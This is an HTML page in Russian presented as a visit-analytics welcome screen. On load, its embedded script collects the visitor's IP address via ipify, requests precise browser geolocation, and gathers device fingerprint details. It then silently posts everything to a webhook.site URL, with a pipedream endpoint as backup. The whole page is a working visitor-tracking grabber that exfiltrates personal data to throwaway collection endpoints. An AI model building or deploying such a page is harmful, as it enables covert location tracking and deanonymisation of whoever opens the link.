<!DOCTYPE html>
<html>
<head>
    <title>Аналитика посещений</title>
    <style>
        #debug-output {
            font-family: monospace;
            background: #f5f5f5;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
            max-height: 200px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <h1>Добро пожаловать!</h1>
    <p>Идёт сбор основных данных...</p>
    
    <div id="debug-output"></div>

    <script>
        const debugEl = document.getElementById('debug-output');
        
        function debugLog(message) {
            console.log('[DEBUG]', message);
            debugEl.innerHTML += `<p>${new Date().toLocaleTimeString()}: ${message}</p>`;
        }

        // 1. Получение IP (рабочий CORS-совместимый метод)
        async function getIP() {
            try {
                debugLog("Получаем IP адрес...");
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                debugLog(`IP получен: ${data.ip}`);
                return data.ip;
            } catch (error) {
                debugLog("Ошибка получения IP: " + error.message);
                return "unknown";
            }
        }

        // 2. Альтернативный метод геолокации (без CORS ошибок)
        async function getGeoData(ip) {
            if (ip === "unknown") return null;
            
            try {
                debugLog("Пробуем Geolocation API...");
                return await new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                source: "browser_geolocation",
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            });
                        },
                        (error) => {
                            debugLog("Geolocation error: " + error.message);
                            resolve(null);
                        },
                        { timeout: 5000 }
                    );
                });
            } catch (error) {
                debugLog("Ошибка геолокации: " + error.message);
                return null;
            }
        }

        // 3. Надежная отправка данных
        async function sendData(data) {
            const fallbackUrls = [
                'https://webhook.site/ddd4aa2b-23c4-4d6e-a6d7-b1fc40240a85',
                'https://eo1fwpqj4jdtwvx.m.pipedream.net' // резервный webhook
            ];
            
            for (const url of fallbackUrls) {
                try {
                    debugLog(`Пробуем отправить на ${url}...`);
                    const response = await fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    });
                    
                    if (response.ok) {
                        debugLog("Данные успешно отправлены!");
                        return true;
                    }
                } catch (error) {
                    debugLog(`Ошибка отправки (${url}): ${error.message}`);
                }
            }
            return false;
        }

        // 4. Сбор всех данных
        async function collectAllData() {
            const ip = await getIP();
            const geoData = await getGeoData(ip);
            
            const result = {
                meta: {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    pageTitle: document.title
                },
                device: {
                    ip: ip,
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: window.screen.colorDepth,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cpuCores: navigator.hardwareConcurrency || "unknown",
                    deviceMemory: navigator.deviceMemory || "unknown"
                },
                location: geoData,
                network: {
                    online: navigator.onLine,
                    connectionType: navigator.connection?.effectiveType || "unknown"
                }
            };

            debugLog("Финальные данные:\n" + JSON.stringify(result, null, 2));
            await sendData(result);
        }

        // Запуск при загрузке
        window.addEventListener('DOMContentLoaded', () => {
            debugLog("Начало работы скрипта...");
            collectAllData();
        });
    </script>
</body>
</html>
